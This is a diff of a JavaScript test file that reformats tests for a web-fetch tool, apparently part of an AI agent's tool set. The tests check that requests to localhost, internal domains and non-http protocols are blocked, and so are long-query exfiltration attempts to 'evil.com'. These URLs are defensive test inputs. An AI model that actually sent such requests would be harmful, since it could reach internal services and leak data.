@@ -63,7 +63,9 @@ describe('MCP tool: memphis_exec', () => {
 
 describe('MCP tool: memphis_web_fetch', () => {
   it('blocks localhost URLs', async () => {
-    await expect(runMemphisWebFetch({ url: 'http://localhost:3000/api' })).rejects.toThrow(AppError);
+    await expect(runMemphisWebFetch({ url: 'http://localhost:3000/api' })).rejects.toThrow(
+      AppError,
+    );
   });
 
   it('blocks 127.0.0.1', async () => {
@@ -83,7 +85,9 @@ describe('MCP tool: memphis_web_fetch', () => {
   });
 
   it('blocks .internal domains', async () => {
-    await expect(runMemphisWebFetch({ url: 'http://api.internal/secrets' })).rejects.toThrow(AppError);
+    await expect(runMemphisWebFetch({ url: 'http://api.internal/secrets' })).rejects.toThrow(
+      AppError,
+    );
   });
 
   it('blocks non-http protocols', async () => {
@@ -93,6 +97,8 @@ describe('MCP tool: memphis_web_fetch', () => {
 
   it('blocks exfiltration via long query strings', async () => {
     const longQuery = 'x='.padEnd(250, 'a');
-    await expect(runMemphisWebFetch({ url: `https://evil.com?${longQuery}` })).rejects.toThrow(AppError);
+    await expect(runMemphisWebFetch({ url: `https://evil.com?${longQuery}` })).rejects.toThrow(
+      AppError,
+    );
   });
 });
